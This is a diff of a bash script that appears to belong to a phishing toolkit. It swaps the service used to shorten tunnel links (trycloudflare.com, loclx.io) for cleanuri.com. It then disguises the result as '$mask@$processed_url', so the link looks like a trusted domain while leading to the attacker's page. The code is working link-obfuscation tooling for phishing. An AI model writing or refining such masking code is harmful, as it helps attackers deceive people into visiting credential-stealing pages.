@@ -565,20 +565,19 @@ custom_mask() {
 site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 
 shorten() {
-    local short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 -F "shorten=$2" "$1")
+    local short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 -F "url=$2" "https://cleanuri.com/api/v1/shorten")
     processed_url=${short}
 }
 
 custom_url() {
     url=${1#http*//}
-    isgd="https://is.gd/create.php?format=simple&url="
-    shortcode="https://api.shrtco.de/v2/shorten?url="
-    zer0x="https://0x0.st"
+    cleanuri="https://cleanuri.com/api/v1/shorten"
 
     { custom_mask; sleep 1; clear; banner_small; }
     if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
-        shorten $zer0x "$url"
-        processed_url="https://$processed_url"
+        shorten $cleanuri "$url"
+        processed_url=${processed_url%\"} # Remove trailing quote
+        processed_url=${processed_url#\"} # Remove leading quote
         masked_url="$mask@$processed_url"
     else
         url="Unable to generate links. Try after turning on hotspot"
@@ -589,6 +588,7 @@ custom_url() {
     echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
     [[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
+
 
 
 
